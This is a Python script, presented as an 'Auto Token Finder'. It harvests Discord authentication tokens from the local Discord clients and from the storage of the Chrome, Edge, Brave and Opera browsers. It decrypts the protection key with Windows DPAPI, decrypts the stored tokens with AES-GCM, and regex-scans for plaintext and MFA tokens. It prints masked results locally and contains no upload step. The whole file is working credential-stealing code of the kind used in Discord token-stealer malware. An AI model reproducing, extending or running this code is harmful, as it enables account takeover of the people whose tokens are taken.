"""
Auto Token Finder for Discord
Extracts Discord tokens from local Discord client installations.
Supports both encrypted (newer) and unencrypted (legacy) tokens.
"""

import os
import re
import json
import base64

def get_discord_paths():
    """Get all possible Discord token storage paths."""
    local_appdata = os.environ.get('LOCALAPPDATA', '')
    appdata = os.environ.get('APPDATA', '')
    
    paths = {}
    
    # Discord clients - map path to Local State path
    discord_apps = {
        'Discord': os.path.join(appdata, 'Discord'),
        'Discord Canary': os.path.join(appdata, 'discordcanary'),
        'Discord PTB': os.path.join(appdata, 'discordptb'),
    }
    
    # Browser paths
    browser_apps = {
        'Chrome': os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default'),
        'Edge': os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Brave': os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable'),
    }
    
    for name, base_path in discord_apps.items():
        leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
        local_state_path = os.path.join(base_path, 'Local State')
        if os.path.exists(leveldb_path):
            paths[name] = {
                'leveldb': leveldb_path,
                'local_state': local_state_path if os.path.exists(local_state_path) else None
            }
    
    for name, base_path in browser_apps.items():
        leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
        # Browsers store Local State one level up
        local_state_path = os.path.join(os.path.dirname(base_path), 'Local State')
        if os.path.exists(leveldb_path):
            paths[name] = {
                'leveldb': leveldb_path,
                'local_state': local_state_path if os.path.exists(local_state_path) else None
            }
    
    return paths


def get_encryption_key(local_state_path):
    """Get the Discord/Browser encryption key from Local State file."""
    if not local_state_path or not os.path.exists(local_state_path):
        return None
        
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
        if not encrypted_key:
            return None
            
        # Decode the base64 key
        encrypted_key = base64.b64decode(encrypted_key)
        # Remove DPAPI prefix (first 5 bytes = "DPAPI")
        encrypted_key = encrypted_key[5:]
        
        # Use Windows DPAPI to decrypt
        try:
            import win32crypt
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except ImportError:
            print("Warning: win32crypt not available. Encrypted tokens cannot be decrypted.")
            return None
        except Exception as e:
            print(f"Warning: Failed to decrypt key: {e}")
            return None
            
    except Exception as e:
        print(f"Warning: Failed to read Local State: {e}")
        return None


def decrypt_token(encrypted_token, key):
    """Decrypt an encrypted Discord token using AES-GCM."""
    if not key:
        return None
    
    try:
        # Try PyCryptodome first
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            from Crypto.Cipher import AES
        
        # Token format: base64(nonce[12] + ciphertext + tag[16])
        # The encrypted token in leveldb has format: v10/v11 prefix + encrypted data
        encrypted_value = base64.b64decode(encrypted_token)
        
        # Extract nonce (first 12 bytes after version prefix) and ciphertext
        nonce = encrypted_value[3:15]
        ciphertext = encrypted_value[15:]
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_GCM, nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        
        return decrypted.decode('utf-8')
        
    except Exception as e:
        return None


def extract_tokens_from_path(leveldb_path, encryption_key=None):
    """Extract tokens from a leveldb path."""
    tokens = []
    
    # Patterns
    # Encrypted token pattern (starts with dQw4w9WgXcQ:)
    encrypted_pattern = r'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)'
    # Unencrypted token patterns
    token_patterns = [
        r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}',  # Standard token
        r'mfa\.[\w-]{84}',  # MFA token
    ]
    
    try:
        for filename in os.listdir(leveldb_path):
            filepath = os.path.join(leveldb_path, filename)
            if not os.path.isfile(filepath):
                continue
            
            # Read .ldb and .log files
            if not (filename.endswith('.ldb') or filename.endswith('.log')):
                continue
                
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                    
                # Try to decode as text
                try:
                    text_content = content.decode('utf-8', errors='ignore')
                except:
                    text_content = content.decode('latin-1', errors='ignore')
                
                # Look for encrypted tokens first
                for match in re.finditer(encrypted_pattern, text_content):
                    encrypted_token = match.group(1)
                    if encryption_key:
                        decrypted = decrypt_token(encrypted_token, encryption_key)
                        if decrypted and decrypted not in tokens:
                            tokens.append(decrypted)
                
                # Look for unencrypted tokens
                for pattern in token_patterns:
                    for match in re.finditer(pattern, text_content):
                        token = match.group(0)
                        if token not in tokens and len(token) > 50:  # Basic validation
                            tokens.append(token)
                            
            except Exception:
                pass
                
    except Exception:
        pass
    
    return tokens


def find_tokens():
    """
    Find all Discord tokens on the system.
    Returns a list of tuples: (token, source)
    """
    found_tokens = []
    seen = set()
    
    paths = get_discord_paths()
    
    for source_name, path_info in paths.items():
        leveldb_path = path_info['leveldb']
        local_state_path = path_info.get('local_state')
        
        # Get encryption key for this app
        encryption_key = get_encryption_key(local_state_path)
        
        # Extract tokens
        tokens = extract_tokens_from_path(leveldb_path, encryption_key)
        
        for token in tokens:
            if token not in seen:
                seen.add(token)
                found_tokens.append((token, source_name))
    
    return found_tokens


def validate_token_format(token):
    """Basic validation of token format."""
    if not token:
        return False
    # Check minimum length
    if len(token) < 50:
        return False
    # Check if it has the expected structure (three parts separated by dots)
    parts = token.split('.')
    if len(parts) >= 3:
        return True
    # Check MFA token format
    if token.startswith('mfa.'):
        return True
    return False


if __name__ == '__main__':
    print("Searching for Discord tokens...")
    tokens = find_tokens()
    
    if tokens:
        print(f"\nFound {len(tokens)} token(s):")
        for token, source in tokens:
            # Mask the token for security
            if len(token) > 30:
                masked = token[:20] + '...' + token[-10:]
            else:
                masked = token[:10] + '...'
            print(f"  [{source}] {masked}")
            print(f"    Valid format: {validate_token_format(token)}")
    else:
        print("No tokens found.")
